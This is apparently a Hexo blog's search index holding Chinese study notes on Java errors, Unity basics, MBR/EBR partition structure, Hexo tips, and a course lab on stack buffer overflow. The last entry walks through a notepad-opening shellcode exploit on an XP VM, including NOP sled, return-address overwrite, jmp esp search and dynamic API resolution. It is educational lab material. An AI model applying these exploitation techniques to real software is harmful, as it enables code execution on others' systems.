<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>java.util.ConcurrentModificationException</title>
    <url>/hexo-test/Information-Security-Study/Code-Language/Java/java-util-ConcurrentModificationException/</url>
    <content><![CDATA[<p>在使用迭代器进行数组的遍历时遇到报错：java.util.ConcurrentModificationException</p>
<p>原因：<a href="https://www.jianshu.com/p/c5b52927a61a" target="_blank" rel="noopener">https://www.jianshu.com/p/c5b52927a61a</a></p>
]]></content>
      <categories>
        <category>Information Security Study</category>
        <category>Code Language</category>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>Exceptions</tag>
      </tags>
  </entry>
  <entry>
    <title>Unity</title>
    <url>/hexo-test/uncategorized/Unity/</url>
    <content><![CDATA[<p>unity是创建游戏和三维互动内容开发工具<br>2D游戏：锁定视角，二维坐标<br>3D游戏：无锁定视角，三维坐标（x,y,z）<br>游戏引擎：游戏的核心代码，提供各种功能<br>使用：<br>鼠标滚轮：放大缩小<br>Q或鼠标滚轮（按下）：拖动场景<br>鼠标右键：基于目前视角旋转<br>鼠标左键：选中<br>W：切换到物体移动<br>R：切换到物体缩放<br>E：旋转物体<br>CTRL（按住）：基于坐标轴平移<br>Ｆ键或层级面板中双击对象：将选中对象在sence面板置中<br>alt+鼠标左键：围绕对象旋转<br>alt+鼠标右键：缩放场景<br>右键+WSDAQE可实现场景漫游<br>V键+鼠标左键选中顶点：顶点吸附（与其他对象以顶点为目标进行贴附）<br>CTRL + D：复制<br>CTRL + SHIFT + F : 把选中物体移动到视角点</p>
<p>物体是一个容器，mesh 决定物体的颜色和外观（mesh filter &amp; mesh renderer（负责渲染））<br>创建物体默认在屏幕中间<br>子对象的偏移（指各种偏移）是相对于其父对象的偏移<br>子物体将继承父物体的更改，但是子物体不影响父物体<br>    * 一般将公用组件放在父物体上，防止更改模型</p>
<p>材质：指包含颜色、纹理（附加到物体表面的贴图）、光滑度等的Shader的实例<br>    * Shader：专门用来渲染图形的技术，可以使纹理以某种形式展示。实际上就是一段嵌入到渲染管线中的程序，可以控制GPU运算图像效果的算法。不同的Shader可设定的属性值一般不同。<br>    * 材质属性存在于mesh renderer的Materials里面<br>    * <strong>导入Shader：需要通过材质来导入</strong></p>
<p>天空盒（是一个独立的组件）：围绕整个场景的包装器，用于模拟天空的<strong>材质</strong><br>使用：<br>    * 设置摄像机 Clear Flags 属性为 Skybox<br>    * 方式一：摄像机添加组件 Skybox<br>    * 方式二：光照窗口 Window - Lighting - Environment Lighting - Skybox<br>        此方法可以作为反射源将天空色彩反射到场景中物体（常用，真实性up）<br>    * 6 Sided：六张图片联合渲染成整个场景<br>    * Procedural：默认天空盒</p>
<p>渲染管线：<br>    图形数据在GPU上经过运算处理，最后输出到屏幕的过程<br>    CPU || 游戏 -&gt; 图形API -&gt; GPU || 顶点处理 -&gt; 图元装配 -&gt; 光栈化 -&gt; 像素处理 -&gt; 缓存<br>    * draw call ：每帧调用显卡渲染物体的次数<br>    * 顶点处理 ：接受模型顶点数据；坐标系转换（游戏坐标 -&gt; 屏幕2D坐标）；<br>    * 图元装配 ：组装面：连接相邻的顶点，绘制成三角面<br>    * 光栅化 ：计算三角面上的像素，为后面的着色阶段提供合理的插值参数<br>    * 像素处理 ：对每个像素区域进行着色；写入到缓存当中<br>    * 缓存 （起缓冲作用）：一个存储箱数数据的内存块，最重要的是帧缓存和深度缓存；<br>    * * 帧缓存：存储每个像素的色彩，即渲染后的图像。帧缓存常常在显存中，显卡不断地读取并输出到屏幕中。<br>    * * 深度缓存 z-buffer ：存储像素的深度信息，即物体到摄像机的距离。光栅化时便计算各像素的深度值，如果新的深度值比现有的近，则像素颜色被写到帧缓存，并替换深度缓存（即重叠时显示更近的或者上层的物体面）。<br><strong>Occlusion Culling （及时遮挡剔除）：当物体被松紧渲染流水线之前，将摄像机视角内看不到的物体进行剔除，从而减少了每帧渲染数据量，提高渲染性能。</strong><br>    * 原理 ：由摄像机发射出射线，当射线与物体发生碰撞时（<strong>需要添加碰撞器Collider组件</strong>），渲染该层，反之则剔除。<br>    * 优点 ：优化性能，减少GPU占用<br>    * 缺点 ：判断是否被遮挡需要CPU额外的开销，当场景中存在大量的分布密集的物体时使用。</p>
<p>LOD（Levels of Detail多细节层次） ：<br>    LOD技术指根据物体模型节点（顶点）在显示环境中所处的位置和重要度，决定物体渲染的资源分配，降低非重要物体的面数和细节度，从而获得高效率的渲染运算。</p>
<p>GI（Global Illumination,全局光照）：<br>    能够计算直接光，间接光、环境光以及反射光的光照系统。通过GI算法可以使得渲染出来的光照效果更加的真实丰富。<br>    * 直接光 ：从物体直接散发出的光照<br>    * 间接光 ：光照打到物体上被反射的光（Lightmap static）<br>    * 烘焙 ：当场景包含大量物体时，实时光照和阴影对游戏性能有很大的影响。使用烘焙技术可以将光线效果预渲染成贴图再作用到物体上模拟光影，从而提高性能。适用于在性能较低的设备上运行的程序。</p>
]]></content>
  </entry>
  <entry>
    <title>Java随笔1</title>
    <url>/hexo-test/Information-Security-Study/Code-Language/Java/Notes/note1/</url>
    <content><![CDATA[<h1 id="记一下常见的编译遇到的问题"><a href="#记一下常见的编译遇到的问题" class="headerlink" title="记一下常见的编译遇到的问题"></a>记一下常见的编译遇到的问题</h1><p>在使用 javac 编译器编译源代码文件时，可能会出现下面几个常见问题。</p>
<a id="more"></a>
<p>(1) Error:cannot read:HelloJava.java javac。<br>工具程序找不到指定的 java 文件，需要检查文件是否存储在当前目录中，或文件名是否错误。</p>
<p>(2) HelloJava.java:4:class HelloJava is public,should be declared in a file named MyApplication.java。<br>源文件中类的名称和源文件名称不符，需要确定源文件名称和类名称是否相同。</p>
<p>(3) HelloJava.java:6:cannot find symbol。<br>源程序文件中某些代码部分输入错了，最常产生的原因可能是没有注意到字母的大小写。</p>
<p>(4) Javac 不是内部或外部命令、可执行程序或批量文件。<br>path 设置有误或没有在 path 系统变量中加入 JDK 的 bin 目录。</p>
<p>如果没有出现上述所列问题，即成功编译了该 Java 文件。在解释执行 .dass 文件时，可能会出现下面几个常见问题。</p>
<p>(1) Exception in thread “main” java.lang.NoClassDe£FoundError。<br>Java 工具程序找不到所指定的 .class 类，需要确定指定的类是否存储在当前目录中，名称是否正确。</p>
<p>(2) Exception in thread “main” java.lang.NoSuchMetliodError:main。<br>没有指定 Java 程序的入口。Java 工具程序指定的类必须有一个程序入口，也就是必须包括 main(String args[]) 这个方法。</p>
]]></content>
      <categories>
        <category>Information Security Study</category>
        <category>Code Language</category>
        <category>Java</category>
        <category>Notes</category>
      </categories>
      <tags>
        <tag>Note</tag>
      </tags>
  </entry>
  <entry>
    <title>MBR和EBR</title>
    <url>/hexo-test/Information-Security-Study/Others/MBR%EF%BC%86EBR/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>写这个的原因是做病毒实验（没错，又是病毒实验-_-）划分磁盘分区的时候，看老师的讲解视频看的一头雾水。她实在是太能折腾了，绕来绕去一大堆就为了讲一句话，头疼。防止以后忘了，写一笔（我可不想再被折磨一次）。</p>
<a id="more"></a>
<p>感谢两位大佬的文章：</p>
<a href="http://www.soilhead.cn/post-51.html" title target>cazure</a>以及<a href="https://www.cnblogs.com/april30138/p/3924930.html" title target>叶子清风</a>
<h1 id="1、MBR"><a href="#1、MBR" class="headerlink" title="1、MBR"></a>1、MBR</h1><h2 id="硬盘结构"><a href="#硬盘结构" class="headerlink" title="硬盘结构"></a>硬盘结构</h2><p>要提MBR和EBR那就绕不过硬盘结构这坎儿，硬盘有很多盘片组成，每个盘片的每个面都有一个读写磁头。如果有N个盘片。就有2N个面，对应2N个磁头(Heads)，从0、1、2开始编号。每个盘片的半径均为固定值R的同心圆再逻辑上形成了一个以电机主轴为轴的柱面(Cylinders)，从外至里编号为0、1、2……。每个盘片上的每个磁道又被划分为几十个扇区(Sector)，通常的容量是512byte，并按照一定规则编号为1、2、3……形成Cylinders×Heads×Sector个扇区。</p>
<img data-src="/hexo-test/Information-Security-Study/Others/MBR%EF%BC%86EBR/%E7%A1%AC%E7%9B%98%E7%BB%93%E6%9E%84.png" class>
<h2 id="主引导扇区MBR（master-boot-record）"><a href="#主引导扇区MBR（master-boot-record）" class="headerlink" title="主引导扇区MBR（master boot record）"></a>主引导扇区MBR（master boot record）</h2><p>主引导记录（Master Boot Record，缩写：MBR），又叫做主引导扇区，是计算机开机后访问硬盘时所必须要读取的首个扇区，它在硬盘上的三维地址为（0柱面，0磁头，1扇区）,bios在执行自己固有的程序以后就会jump到MBR中的第一条指令。将系统的控制权交由MBR来执行。在深入讨论主引导扇区内部结构的时候，有时也将其开头的446字节内容特指为“主引导记录”MBR（Master Boot Record或者Main Boot Record），其后是4个16字节的“磁盘分区表”DPT（Disk Partition Table），以及2字节的结束标志（55AA）。因此，在使用“主引导记录”（MBR）这个术语的时候，需要根据具体情况判断其到底是指整个主引导扇区，还是主引导扇区的前446字节。</p>
<img data-src="/hexo-test/Information-Security-Study/Others/MBR%EF%BC%86EBR/MBR%E6%95%B0%E6%8D%AE%E6%9E%84%E6%88%90.png" class>
<p>对于硬盘而言，一个扇区可能的字节数为128×2n (n=0,1,2,3)。大多情况下，取n=2，即一个扇区(sector)的大小为512字节。在总共512byte的主引导记录中，MBR的引导程序占了其中的前446个字节(偏移0H ~ 偏移1BDH)，随后的64个字节(偏移1BEH~偏移1FDH)为DPT(Disk PartitionTable，硬盘分区表)，最后的两个字节“55 AA”(偏移1FEH ~ 偏移1FFH)是分区有效结束标志。</p>
<p>利用WinHex查看最开始的512B</p>
<img data-src="/hexo-test/Information-Security-Study/Others/MBR%EF%BC%86EBR/MBR%E6%95%B0%E6%8D%AE%E8%AF%A6%E6%83%85.png" class>
<h2 id="启动代码-boot"><a href="#启动代码-boot" class="headerlink" title="启动代码 boot"></a>启动代码 boot</h2><p> 主引导记录最开头是第一阶段引导代码。其中的硬盘引导程序的主要作用是检查分区表是否正确并且在系统硬件完成自检以后将控制权交给硬盘上的引导程序（如GNU GRUB）。 它不依赖任何操作系统，而且启动代码也是可以改变的，从而能够实现多系统引导。MRB的引导代码是计算机系统的关键，如果这个不能正常工作系统就启动不了。</p>
<h2 id="硬盘分区表-DPT（Disk-Partition-Table）"><a href="#硬盘分区表-DPT（Disk-Partition-Table）" class="headerlink" title="硬盘分区表 DPT（Disk Partition Table）"></a>硬盘分区表 DPT（Disk Partition Table）</h2><p>硬盘分区表占据主引导扇区的64个字节(偏移01BEH–偏移01FDH)，可以对四个分区的信息进行描述，其中每个分区的信息占据16个字节。具体每个字节的定义可以参见硬盘分区结构信息。</p>
<img data-src="/hexo-test/Information-Security-Study/Others/MBR%EF%BC%86EBR/DPT%E8%AF%A6%E8%A7%A3.png" class>
<p>举个栗子</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">windwos（0x1be - 0x1cd）： 80 01 01 00   07 FE FF FF    3F 00 00 00   00 34 80 0C </span><br><span class="line"></span><br><span class="line">	80：表示该分区为活动分区</span><br><span class="line"></span><br><span class="line">	01 01 00：开始磁头&#x2F;开始扇区和开始柱面</span><br><span class="line"></span><br><span class="line">	07 ：文件系统标志位  07表示NTFS文件系统(文件系统标记.jpg)</span><br><span class="line"></span><br><span class="line">	FE FF FF ：结束磁头&#x2F;结束扇区和结束柱面</span><br><span class="line"></span><br><span class="line">	00 00 00 3F ：分区起始的相对扇区号</span><br><span class="line"></span><br><span class="line">	0C 80 34 00：分区总的扇区数</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">linux    （0x1be - 0x1cd）： 00 00 01 40    83 00 81 7C    00 08 00 00    81 47 12 00</span><br><span class="line"></span><br><span class="line">    00 ：表示该分区为非活动分区</span><br><span class="line"></span><br><span class="line">    00 01 40：开始磁头&#x2F;开始扇区和开始柱面</span><br><span class="line"></span><br><span class="line">    83：文件系统标志位  83表示EXT文件系统(文件系统标记.jpg)</span><br><span class="line"></span><br><span class="line">    00 81 7C：结束磁头&#x2F;结束扇区和结束柱面</span><br><span class="line"></span><br><span class="line">    00 08 00 00：分区起始的相对扇区号</span><br><span class="line"></span><br><span class="line">    81 47 12 00：分区总的扇区数</span><br></pre></td></tr></table></figure>
<p> 从主引导记录的结构可以知道，它仅仅包含一个64个字节的硬盘分区表。由于每个分区信息需要16个字节，所以对于采用MBR型分区结构的硬盘，最多只能识别4个主要分区（Primary partition）。<br>所以对于一个采用此种分区结构的硬盘来说，想要得到4个以上的主要分区是不可能的。这里就需要引出扩展分区（EBR）了。扩展分区也是主要分区的一种，但它与主分区的不同在于理论上可以划分为无数个逻辑分区。扩展分区中逻辑驱动器的引导记录是链式的。每一个逻辑分区都有一个和MBR结构类似的扩展引导记录(EBR)，其分区表的第一项指向该逻辑分区本身的引导扇区，第二项指向下一个逻辑驱动器的EBR，分区表第三、第四项没有用到。<br>系统默认情况下，一般都是只划分一个主分区给系统，剩余的部分全部划入扩展分区。</p>
<h2 id="结束标志字"><a href="#结束标志字" class="headerlink" title="结束标志字"></a>结束标志字</h2><p>结束标志字55，AA（偏移1FEH- 偏移1FFH）是MBR扇区的最后两个字节，是检验主引导记录是否有效的标志。</p>
<h2 id="电脑启动过程"><a href="#电脑启动过程" class="headerlink" title="电脑启动过程"></a>电脑启动过程</h2><p>了解了上面的东西过后，不妨来探究一下电脑的启动过程</p>
<ul>
<li>系统开机或者重启。</li>
<li>BIOS 加电自检 ( Power On Self Test – POST )。BIOS执行内存地址为 FFFF:0000H 处的跳转指令，跳转到固化在ROM中的自检程序处，对系统硬件(包括内存)进行检查。</li>
<li>读取主引导记录(MBR)扇区。当BIOS检查到硬件正常并与 CMOS 中的设置相符后，按照 CMOS 中对启动设备的设置顺序检测可用的启动设备。BIOS将相应启动设备的第一个扇区(也就是MBR扇区)读入内存地址为0000:7C00H 处。</li>
<li>检查0000:7DFEH-0000:7DFFH(MBR的结束标志位)是否等于 AA55H，若不等于则转去尝试其他启动设备，如果没有启动设备满足要求则显示”NO ROM BASIC”然后死机。</li>
<li>当检测到有启动设备满足要求后，BIOS将控制权交给相应启动设备。启动设备的MBR将自己复制到0000:0600H处, 然后继续执行。</li>
<li>在主分区表中搜索标志为活动的分区，也就是检验磁盘分区表DPT的首字节是不是80H。如果检测到80H，则表示该分区为活动分区，将该活动分区的第一个扇区(操作系统引导记录区，Dos Boot Recorder,DBR)读入内存地址 0000:7C00H 处。</li>
<li>检查0000:7DFEH-0000:7DFFH(DBR的结束标志位)是否等于 AA55H, 若不等于则显示 : “Missing Operating System” 然后停止。</li>
<li>当检测到有分区满足要求后，MBR将控制权交给相应的活动分区。</li>
</ul>
<p>简单的说，就是BIOS -&gt; 硬盘MBR -&gt; 活动分区DBR -&gt; 操作系统这样一个过程。</p>
<h1 id="2、EBR"><a href="#2、EBR" class="headerlink" title="2、EBR"></a>2、EBR</h1><p>EBR（Extended Boot Record）则是与MBR相对应的一个概念。前边已经讲过，MBR里有一个DPT（Disk Partition Table,磁盘分区表）的区域，它一共是64字节，按每16个字节 作为一个分区表项，它最多只能容纳4个分区。能够在MBR的DPT里进行说明的分区称为主分区。如果我们想分区多于4个的时候，MBR的DPT里就会容纳不下来，于是微软就想出了另一个解决方案，在MBR里，只放不多于三个主分区（通常只放一个）剩下的分区，则由与MBR结构很相像的另一种分区结构（EBR，也就是扩展分区引导记录）里进行说明。一个EBR不够用时，可以增加另一个EBR，如此像一根根链条一样地接下去，直到够用为止。</p>
<img data-src="/hexo-test/Information-Security-Study/Others/MBR%EF%BC%86EBR/%E7%A3%81%E7%9B%98%E5%88%86%E5%8C%BA.png" class>
<p>如图，未被浅色边框框柱的部分为主分区，被框住的则为拓展分区</p>
<h2 id="拓展分区引导记录"><a href="#拓展分区引导记录" class="headerlink" title="拓展分区引导记录"></a>拓展分区引导记录</h2><img data-src="/hexo-test/Information-Security-Study/Others/MBR%EF%BC%86EBR/%E5%9B%9B%E5%88%86%E5%8C%BA.png" class><img data-src="/hexo-test/Information-Security-Study/Others/MBR%EF%BC%86EBR/%E9%93%BE%E6%8E%A5.png" class>
<p>关于它们之间的链式结构主要体现在所有的拓展分区引导记录里的开始地址都是相对于第一个拓展分区的开始地址而言的相对地址，如：</p>
<img data-src="/hexo-test/Information-Security-Study/Others/MBR%EF%BC%86EBR/EBR%E4%BE%8B%E5%AD%90.png" class>
<p>这是一个拓展分区引导记录里的下一个EBR的开始地址，这是一个相对地址，它等于真正的地址-第一个拓展分区EBR的开始地址。或者说，<font color="red">真实地址=相对地址+第一个拓展分区EBR的开始地址</font>，当EBR中出现下图的情况时就表明没有拓展分区了</p>
<img data-src="/hexo-test/Information-Security-Study/Others/MBR%EF%BC%86EBR/%E5%AE%8C%E7%BB%93.png" class>
<p>最后附上文件系统标记</p>
<img data-src="/hexo-test/Information-Security-Study/Others/MBR%EF%BC%86EBR/%E6%96%87%E4%BB%B6%E6%A0%87%E8%AE%B0.png" class>
<h1 id="闲话"><a href="#闲话" class="headerlink" title="闲话"></a>闲话</h1><p>病毒这玩意着实难搞，什么都得会点，但也正是因为要记的东西太多了，脑子容易宕机，所以才萌生了些Blog的想法，也不全是坏事^_^</p>
]]></content>
      <categories>
        <category>Information Security Study</category>
        <category>Others</category>
      </categories>
      <tags>
        <tag>Others</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo使用技巧</title>
    <url>/hexo-test/Others/HexoUseskill/</url>
    <content><![CDATA[<p>到头来仔细一想，反正什么都要写，为什么不把Hexo的标签做个记录呢~省的到时候每次用还得去官网扒拉^_^</p>
<a id="more"></a>

<h2 id="创建新文章"><a href="#创建新文章" class="headerlink" title="创建新文章"></a>创建新文章</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo new [layout] &lt;title&gt; &#x2F;&#x2F;创建新的文章或者新页面</span><br><span class="line">						  &#x2F;&#x2F;:title	标题（小写，空格将会被替换为短杠）</span><br><span class="line">						&#x2F;&#x2F;:year	建立的年份，比如， 2015</span><br><span class="line">						&#x2F;&#x2F;:month	建立的月份（有前导零），比如， 04</span><br><span class="line">						&#x2F;&#x2F;:i_month	建立的月份（无前导零），比如， 4</span><br><span class="line">						&#x2F;&#x2F;:day	建立的日期（有前导零），比如， 07</span><br><span class="line">						&#x2F;&#x2F;:i_day	建立的日期（无前导零），比如， 7</span><br></pre></td></tr></table></figure>
<h2 id="文章属性的设置-Front-matter"><a href="#文章属性的设置-Front-matter" class="headerlink" title="文章属性的设置(Front-matter)"></a>文章属性的设置(Front-matter)</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">layout	布局	</span><br><span class="line">title	标题	文章的文件名</span><br><span class="line">date	建立日期	文件建立日期</span><br><span class="line">updated	更新日期	文件更新日期</span><br><span class="line">comments	开启文章的评论功能	true</span><br><span class="line">tags	标签（不适用于分页）	</span><br><span class="line">categories	分类（不适用于分页）	</span><br><span class="line">permalink	覆盖文章网址	</span><br><span class="line">keywords	仅用于 meta 标签和 Open Graph 的关键词（不推荐使用）</span><br></pre></td></tr></table></figure>
<p>关于配置多个标签和分类的情况，可以使用类似</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tags:</span><br><span class="line">- tag1</span><br><span class="line">- tag2</span><br><span class="line">categories:</span><br><span class="line">- [Diary, PlayStation] &#x2F;&#x2F;Diary为父类,PlayStation为子类</span><br><span class="line">- [Diary, Games]</span><br><span class="line">- [Life]</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Others</category>
      </categories>
      <tags>
        <tag>Others</tag>
      </tags>
  </entry>
  <entry>
    <title>记病毒缓冲区溢出实验</title>
    <url>/hexo-test/Information-Security-Study/Others/Virus/</url>
    <content><![CDATA[<h1 id="1、缓冲区溢出"><a href="#1、缓冲区溢出" class="headerlink" title="1、缓冲区溢出"></a>1、缓冲区溢出</h1><h2 id="1-1缓冲区溢出条件："><a href="#1-1缓冲区溢出条件：" class="headerlink" title="1.1缓冲区溢出条件："></a>1.1缓冲区溢出条件：</h2><p>1.使用非类型安全的语言（C或者C++），当缓冲区操作时不对边界做出检查，WHAT？通俗的说就是strcpy，memcpy等串操作和内存块拷贝操作缓冲区时，大数据往小空间上拷贝，造成溢出。<br>2.函数调用时栈空间的布局为缓冲区溢出提供了条件</p>
<img data-src="/hexo-test/Information-Security-Study/Others/Virus/%E6%A0%88%E7%A9%BA%E9%97%B4%E5%B8%83%E5%B1%80.png" class title="栈空间布局">

<p>当程序中函数被调用时，系统总是先将被调用函数所需的参数以逆序的方式入栈，然后将调用函数后面那条指令的地址（返回地址）入栈。随后控制转入被调用的函数去执行，程序一般在将需要保存的寄存器的值入栈后开始为被调用函数内的局部变量分配所需的存储空间，从而形成图示堆栈结构。<br>3.如上图，局部变量如果是字符串数组，在进行缓冲区空间分配时，栈内同样符合小端方式对齐的原则，即shellcode[0]在最低端地址上，shellcode[100]在高端地址上，由于被调函数的局部变量分配在返回地址EIP（附近如下图所示：），所以一旦发生溢出，EIP就会被覆盖掉，从而导致程序的运行流程发生变化。</p>
<a id="more"></a>
<img data-src="/hexo-test/Information-Security-Study/Others/Virus/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86.png" class title="缓冲区溢出原理">

<h2 id="结论"><a href="#结论" class="headerlink" title="结论:"></a>结论:</h2><p>由于程序缺少必要的边界检查，如果局部变量中有字符数组存在，只要赋予该数组的字符串足够长，就能将上面的返回地址覆盖掉。字符数组超出了开始为其分配的空间大小，缓冲区溢出就发生了。<br>精心构造溢出所用的字符串，将4个字节返回地址替换成别有用心的地址，当函数返回时，我们就能引导程序到我们指定的代码去执行，从而获得程序控制权。<br>如果地址A所指定的内存空间事先存放了设计好的攻击代码，那么攻击就会随之发生。</p>
<h1 id="2、实例-用缓冲区溢出的方式打开记事本notepad"><a href="#2、实例-用缓冲区溢出的方式打开记事本notepad" class="headerlink" title="2、实例 (用缓冲区溢出的方式打开记事本notepad)#"></a>2、实例 (用缓冲区溢出的方式打开记事本notepad)#</h1><p><em>写在前面，本实例使用的是XP虚拟机</em></p>
<p>1.建工程项目，C或者C++语言，我视频讲解里是VC++6.0写的，所以还是以此介绍。<br>首先建立控制台工程，然后新建C++文件。建立好工程文件后就可以写代码了。</p>
<img data-src="/hexo-test/Information-Security-Study/Others/Virus/%E5%88%9B%E5%BB%BA%E6%8E%A7%E5%88%B6%E5%8F%B0%E7%A8%8B%E5%BA%8F.png" class>
<img data-src="/hexo-test/Information-Security-Study/Others/Virus/%E5%88%9B%E5%BB%BAC++%E7%A8%8B%E5%BA%8F.png" class>
<p>2.写代码，主函数很简单，仅调用一个test()函数，test函数2行代码就搞定了，用memcpy函数造缓冲区溢出，即大数据往小空间上拷贝，关键的问题是shellcode数组的构造，shellcode数组需要完成的功能是覆盖掉返回地址EIP后，转向攻击代码，即打开notepad.exe。<br>主函数仅调用test()函数，test函数就两行代码，只要shellcode的大小超过10，缓冲区溢出就发生了！</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void test()</span><br><span class="line">&#123;</span><br><span class="line">    char buffer[10];</span><br><span class="line">    memcpy(buffer,shellcode,sizeof(shellcode));</span><br><span class="line">&#125;</span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">	test();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Shellcode构造：首先要理解到shellcode的功能，Shellcode是指能完成特殊任务的自包含的二进制代码，根据不同的任务可能是发出一条系统调用或建立一个高权限的Shell,  Shellcode因此得名。我们的实例中，shellcode就是要打开notepad.exe。所以如何构成这样的二进制代码，成为了关键，接触过OllyICE工具后，大家应该知道可以利用该调试工具构造二进制代码，仅需要写上对应的汇编语句。这里大家可以熟悉一下反汇编，push串对应68，push 立即数对应6A，WinExec函数地址为：7C8623AD,ExitProcess函数地址为7C81CAFA。<br> <img data-src="/hexo-test/Information-Security-Study/Others/Virus/%E6%B1%87%E7%BC%96%E8%BD%AC%E4%BA%8C%E8%BF%9B%E5%88%B6.png" class><br>接下来已二进制的形式复制该段代码。粘贴到记事本上：</p>
<img data-src="/hexo-test/Information-Security-Study/Others/Virus/%E4%BA%8C%E8%BF%9B%E5%88%B6%E8%AE%B0%E4%BA%8B%E6%9C%AC.png" class>
<p>然后将其书写成十六进制的样式就好了。</p>
<img data-src="/hexo-test/Information-Security-Study/Others/Virus/%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6shellcode.png" class>
<p>而后编译该程序，报错是肯定的，因为我们并不清楚栈内元素的情况</p>
<img data-src="/hexo-test/Information-Security-Study/Others/Virus/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E9%94%99%E8%AF%AF.png" class>
<p>之后利用OllyICE进行调试</p>
<img data-src="/hexo-test/Information-Security-Study/Others/Virus/OllyICE%E5%B8%83%E5%B1%80.png" class>
<p>将断点放在memcpy函数调用完成的返回地址上,观察堆栈区的情况.</p>
<img data-src="/hexo-test/Information-Security-Study/Others/Virus/memcpy%E5%87%BD%E6%95%B0.png" class>
<p>F9跳转到改地址执行，观察堆栈区</p>
<img data-src="/hexo-test/Information-Security-Study/Others/Virus/%E5%A0%86%E6%A0%88%E5%8C%BA.png" class>
<p>现在的情况是溢出已经发生，但没有控制好溢出后的函数返回地址，让其进入了一个不能读写的地址上去执行，所以报错！<br>唯一的办法就是去耐心的反复调试。本次调试前，请先加上一组0X90（对应汇编nop，即空操作），如下：</p>
<img data-src="/hexo-test/Information-Security-Study/Others/Virus/%E6%96%B0shellcode.png" class>
<p>运行，报错，0X90909090不可读！继续调试，观察堆栈区情况，返回地址为0x90909090，我们需要改写该地址才能程序进入shellcode区执行，如何填写返回地址，填写内容及位置我们就必须精心计算！返回地址可以填写0012FF88，因为函数返回后跳转到0012FF88上去执行，是一串空操作，但之后就会进入我们写的打开记事本的shellcode 区！所以动手去试下这个位置改写为0012FF88，再运行程序！</p>
<img data-src="/hexo-test/Information-Security-Study/Others/Virus/%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80.png" class>
<p>观察shellcode区，Shellcode第一个有效字符为68，它之前有7个90，然后就是返回地址了，改写情况如下：</p>
<img data-src="/hexo-test/Information-Security-Study/Others/Virus/%E8%AE%B0%E4%BA%8B%E6%9C%ACshellcode.png" class>
<p>一般来说应该是能正确执行的，执行的结果为打开本机的notepad程序</p>
<h1 id="3、推而广之"><a href="#3、推而广之" class="headerlink" title="3、推而广之"></a>3、推而广之</h1><h2 id="3-1前言"><a href="#3-1前言" class="headerlink" title="3.1前言"></a>3.1前言</h2><p>显而易见的是这样的程序通用性很差，只能在本机执行，因为其他机器的堆栈区不一定是在0012FF88后布置攻击代码。以及shellcode里面填写的0X7C8623AD,0X7C81CAFA等数据分别是XP下的WinExec和ExitProcess的函数地址。那么如何解决shellcode硬编码的问题就成了解决程序兼容性的关键！</p>
<h2 id="3-2兼容性解决"><a href="#3-2兼容性解决" class="headerlink" title="3.2兼容性解决"></a>3.2兼容性解决</h2><p><strong>第一步解决的问题是：不同机器布置攻击代码的位置不一样</strong><br>这里的解决方式是，观察函数返回后的ESP指针的情况：</p>
<img data-src="/hexo-test/Information-Security-Study/Others/Virus/ESP%E6%8C%87%E9%92%88.png" class>
<p>观察后发现函数调用返回后栈顶指针的内容恰好为0012FF88，所以如果我们想进入到该地址执行，最后是用一条指令替代硬编码地址，Jmp esp指令可以为你解决该问题。Jmp esp指令对应的二进制码为FFE4，依旧是不同的系统动态链接库并不一样，所以这里也不能使用硬编码写死，简单粗暴的方法就是在本模块中找到FFE4，而不依赖于任何的模块，找到后还是把地址回填到shellcode对应位置上。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DWORD base &#x3D; 0x00400000;</span><br><span class="line">	while (1)</span><br><span class="line">	&#123;</span><br><span class="line">		if (*(WORD*)base &#x3D;&#x3D; 0xe4ff)</span><br><span class="line">			break;</span><br><span class="line">		base ++;</span><br><span class="line">	&#125;</span><br><span class="line">	*(DWORD*)&amp;shellcode[16] &#x3D; base; &#x2F;&#x2F;这里的shellcode[16]根据自己的实际情况回填，他会用查询到的数据替换掉原来的数据</span><br></pre></td></tr></table></figure>
<p>剩下的WinExec和ExitProcess函数也就依葫芦画瓢，利用LoadLibrary和GetProcAddress函数来获取了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DWORD a1 &#x3D; (DWORD)GetProcAddress(LoadLibrary(&quot;kernel32.dll&quot;),&quot;WinExec&quot;);</span><br><span class="line">DWORD a2 &#x3D; (DWORD)GetProcAddress(LoadLibrary(&quot;kernel32.dll&quot;),&quot;ExitProcess&quot;);</span><br><span class="line">*(DWORD*)(shellcode+46) &#x3D; a1; &#x2F;&#x2F;同样的，shellcode后面的数字根据实际情况来填</span><br><span class="line">*(DWORD*)(shellcode+55) &#x3D; a2;</span><br></pre></td></tr></table></figure>
<p>三个硬编码地址处理后，程序通用性就很好了，可以在多个版本操作系统上正常执行！</p>
<h1 id="4、后记"><a href="#4、后记" class="headerlink" title="4、后记"></a>4、后记</h1><p>先附上试验成功的代码：</p>
